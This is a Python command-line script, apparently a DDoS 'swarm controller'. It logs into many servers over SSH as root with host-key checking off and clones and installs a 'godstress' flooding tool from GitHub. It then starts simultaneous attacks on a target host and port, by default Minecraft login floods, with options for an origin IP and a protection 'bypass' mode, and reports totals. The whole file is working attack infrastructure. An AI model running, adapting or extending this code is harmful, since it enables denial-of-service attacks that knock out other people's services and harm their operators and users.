#!/usr/bin/env python3
# swarm.py — distributed swarm controller: connect N bots across M servers, coordinate & test
# usage: python3 swarm.py --servers servers.txt --target TARGET --port PORT --method mc_login --confirm
import argparse, subprocess, threading, time, os, sys, json, socket

# ---------- config ----------
DEFAULT_METHOD = "mc_login"
DEFAULT_PORT = 25565
DEFAULT_CONNS = 500
DEFAULT_DURATION = 300
DEFAULT_TOOL_PATH = "/opt/godstress"
DEFAULT_TOOL = "godstress.py"

# ---------- server manager ----------
class ServerNode:
    def __init__(self, ip, user="root", key=None, port=22):
        self.ip = ip
        self.user = user
        self.key = key
        self.ssh_port = port
        self.status = "idle"
        self.proc = None
        self.output = []
        self.stats = {"sent": 0, "errs": 0, "bytes": 0}

    def ssh_cmd(self, cmd, timeout=30):
        """Run SSH command on this node."""
        ssh = ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10"]
        if self.key:
            ssh += ["-i", self.key]
        if self.ssh_port != 22:
            ssh += ["-p", str(self.ssh_port)]
        ssh += [f"{self.user}@{self.ip}", cmd]
        try:
            r = subprocess.run(ssh, capture_output=True, text=True, timeout=timeout)
            return r.stdout, r.stderr, r.returncode
        except subprocess.TimeoutExpired:
            return "", "timeout", -1
        except Exception as e:
            return "", str(e), -1

    def deploy(self):
        """Deploy tool to this node if not present."""
        out, err, rc = self.ssh_cmd(f"test -f {DEFAULT_TOOL_PATH}/{DEFAULT_TOOL} && echo OK")
        if "OK" in out:
            return True
        print(f"  [{self.ip}] deploying tool...")
        # git clone
        out, err, rc = self.ssh_cmd(f"git clone https://github.com/tickkkkkkyg/godstress.git {DEFAULT_TOOL_PATH} 2>&1 || (cd {DEFAULT_TOOL_PATH} && git pull)")
        if rc != 0:
            # fallback: scp
            subprocess.run(["scp", "-o", "StrictHostKeyChecking=no", "godstress.py",
                           f"{self.user}@{self.ip}:{DEFAULT_TOOL_PATH}/"], capture_output=True)
        # install deps
        self.ssh_cmd(f"cd {DEFAULT_TOOL_PATH} && python3 -m venv .venv 2>/dev/null; .venv/bin/pip install aiohttp uvloop 2>/dev/null")
        return True

    def start_attack(self, target, port, methods, conns, duration, ssl=False, origin=None, bypass=False):
        """Start attack on this node."""
        self.status = "running"
        tool = f"{DEFAULT_TOOL_PATH}/{DEFAULT_TOOL}"
        venv = f"{DEFAULT_TOOL_PATH}/.venv/bin/python3"
        cmd = f"cd {DEFAULT_TOOL_PATH} && {venv} {DEFAULT_TOOL} {target} -p {port} -c {conns} -d {duration} -m {' '.join(methods)}"
        if ssl:
            cmd += " --ssl"
        if origin:
            cmd += f" --origin {origin}"
        if bypass:
            cmd += " --bypass"
        cmd += " --confirm"
        # run in background, capture output to file
        bg_cmd = f"nohup {cmd} > /tmp/swarm_{target}.log 2>&1 & echo $!"
        out, err, rc = self.ssh_cmd(bg_cmd, timeout=15)
        if out.strip():
            self.pid = out.strip().split()[0]
        else:
            self.pid = None
        print(f"  [{self.ip}] started (pid={self.pid})")
        return self.pid

    def stop_attack(self):
        """Stop attack on this node."""
        self.ssh_cmd("pkill -f godstress.py 2>/dev/null; pkill -f godmode.py 2>/dev/null")
        self.status = "stopped"

    def get_output(self):
        """Get attack output from node."""
        out, err, rc = self.ssh_cmd(f"cat /tmp/swarm_*.log 2>/dev/null | tail -20")
        return out

    def get_stats(self):
        """Parse stats from output."""
        out = self.get_output()
        for line in out.split("\n"):
            if "TOTAL" in line:
                # parse: TOTAL sent=X errs=Y bytes=ZMB avg=W/s
                parts = line.split()
                for part in parts:
                    if part.startswith("sent="):
                        self.stats["sent"] = int(part.split("=")[1])
                    elif part.startswith("errs="):
                        self.stats["errs"] = int(part.split("=")[1])
                    elif part.startswith("bytes="):
                        self.stats["bytes"] = float(part.split("=")[1].replace("MB", "")) * 1e6
        return self.stats

# ---------- swarm controller ----------
class SwarmController:
    def __init__(self, servers, target, port, methods, conns, duration, ssl=False, origin=None, bypass=False):
        self.servers = [ServerNode(ip) for ip in servers]
        self.target = target
        self.port = port
        self.methods = methods
        self.conns = conns
        self.duration = duration
        self.ssl = ssl
        self.origin = origin
        self.bypass = bypass
        self.start_time = None
        self.end_time = None

    def deploy_all(self):
        """Deploy tool to all nodes."""
        print(f"[*] Deploying to {len(self.servers)} nodes...")
        threads = []
        for node in self.servers:
            t = threading.Thread(target=node.deploy)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        print(f"[*] Deploy complete")

    def start_all(self):
        """Start attack on all nodes simultaneously."""
        print(f"[*] Starting swarm: {len(self.servers)} nodes → {self.target}:{self.port}")
        print(f"    methods: {self.methods}")
        print(f"    conns/node: {self.conns}, duration: {self.duration}s")
        self.start_time = time.time()
        threads = []
        for node in self.servers:
            t = threading.Thread(target=node.start_attack, args=(
                self.target, self.port, self.methods, self.conns, self.duration,
                self.ssl, self.origin, self.bypass))
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        print(f"[*] All nodes started")

    def monitor(self, interval=5):
        """Monitor all nodes until duration expires."""
        print(f"[*] Monitoring for {self.duration}s...")
        end = time.time() + self.duration
        while time.time() < end:
            time.sleep(interval)
            elapsed = time.time() - self.start_time
            total_sent = sum(n.stats["sent"] for n in self.servers)
            total_errs = sum(n.stats["errs"] for n in self.servers)
            total_bytes = sum(n.stats["bytes"] for n in self.servers)
            rate = total_sent / max(elapsed, 0.01)
            print(f"\r  {elapsed:5.1f}s/{self.duration}s  nodes={len(self.servers)}  "
                  f"sent={total_sent:>10}  errs={total_errs:>8}  rate={rate:>10.0f}/s  "
                  f"bytes={total_bytes/1e6:>8.1f}MB", end="", flush=True)
            # update per-node stats
            for node in self.servers:
                node.get_stats()
        print()
        self.end_time = time.time()

    def stop_all(self):
        """Stop all nodes."""
        print(f"[*] Stopping all nodes...")
        threads = []
        for node in self.servers:
            t = threading.Thread(target=node.stop_attack)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        print(f"[*] All nodes stopped")

    def report(self):
        """Final report."""
        elapsed = self.end_time - self.start_time if self.end_time else self.duration
        total_sent = sum(n.stats["sent"] for n in self.servers)
        total_errs = sum(n.stats["errs"] for n in self.servers)
        total_bytes = sum(n.stats["bytes"] for n in self.servers)
        print(f"\n{'='*60}")
        print(f"  SWARM REPORT")
        print(f"{'='*60}")
        print(f"  Nodes:       {len(self.servers)}")
        print(f"  Target:      {self.target}:{self.port}")
        print(f"  Methods:     {self.methods}")
        print(f"  Duration:    {elapsed:.1f}s")
        print(f"  Total sent:  {total_sent}")
        print(f"  Total errs:  {total_errs}")
        print(f"  Total bytes: {total_bytes/1e6:.1f}MB")
        print(f"  Avg rate:    {total_sent/max(elapsed,0.01):.0f}/s")
        print(f"  Per node:    {total_sent/len(self.servers):.0f} sent, {total_errs/len(self.servers):.0f} errs")
        print(f"{'='*60}")
        # per-node breakdown
        print(f"\n  Per-node breakdown:")
        for node in self.servers:
            print(f"    {node.ip}: sent={node.stats['sent']} errs={node.stats['errs']} bytes={node.stats['bytes']/1e6:.1f}MB")

    def test_connectivity(self):
        """Test SSH connectivity to all nodes."""
        print(f"[*] Testing connectivity to {len(self.servers)} nodes...")
        ok = 0
        for node in self.servers:
            out, err, rc = node.ssh_cmd("echo PONG")
            if "PONG" in out:
                print(f"  [+] {node.ip} — OK")
                ok += 1
            else:
                print(f"  [-] {node.ip} — FAIL ({err.strip()[:50]})")
        print(f"[*] {ok}/{len(self.servers)} nodes reachable")
        return ok == len(self.servers)

# ---------- CLI ----------
def main():
    ap = argparse.ArgumentParser(description="swarm controller — distribute attack across N servers")
    ap.add_argument("--servers", required=True, help="file with server IPs (one per line)")
    ap.add_argument("--target", required=True, help="target host or IP")
    ap.add_argument("-p", "--port", type=int, default=DEFAULT_PORT)
    ap.add_argument("-m", "--methods", nargs="+", default=[DEFAULT_METHOD])
    ap.add_argument("-c", "--conns", type=int, default=DEFAULT_CONNS)
    ap.add_argument("-d", "--duration", type=int, default=DEFAULT_DURATION)
    ap.add_argument("--ssl", action="store_true")
    ap.add_argument("--origin", help="known origin IP")
    ap.add_argument("--bypass", action="store_true", help="use bypass mode")
    ap.add_argument("--user", default="root", help="SSH user")
    ap.add_argument("--key", help="SSH key path")
    ap.add_argument("--deploy", action="store_true", help="deploy tool to all nodes first")
    ap.add_argument("--test", action="store_true", help="test connectivity only")
    ap.add_argument("--confirm", action="store_true")
    args = ap.parse_args()

    if not args.confirm and not args.test:
        print("refusing: pass --confirm (or --test)"); return

    # load servers
    with open(args.servers) as f:
        server_ips = [l.strip() for l in f if l.strip() and not l.startswith("#")]
    print(f"[*] Loaded {len(server_ips)} servers")

    swarm = SwarmController(server_ips, args.target, args.port, args.methods,
                           args.conns, args.duration, args.ssl, args.origin, args.bypass)
    for node in swarm.servers:
        node.user = args.user
        node.key = args.key

    # test connectivity
    if args.test:
        swarm.test_connectivity()
        return

    # deploy
    if args.deploy:
        swarm.deploy_all()

    # test connectivity first
    if not swarm.test_connectivity():
        print("[!] Some nodes unreachable. Continue? (y/n)")
        if input().strip().lower() != "y":
            return

    # start
    swarm.start_all()

    # monitor
    swarm.monitor()

    # stop
    swarm.stop_all()

    # report
    swarm.report()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n  interrupted.")
